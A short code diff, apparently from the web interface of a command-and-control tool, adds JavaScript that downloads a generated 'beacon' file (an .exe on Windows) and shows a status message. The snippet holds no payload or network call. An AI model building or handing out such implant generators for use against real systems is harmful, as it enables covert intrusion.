+    const ext = platform === 'windows' ? '.exe' : '';
+    const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = `beacon${ext}`; a.click();
+    statusEl.style.color = 'var(--online)';
+    statusEl.textContent = `✓ beacon${ext} downloaded.`;
+    setTimeout(() => statusEl.style.display = 'none', 3000);
     return;
   }
 
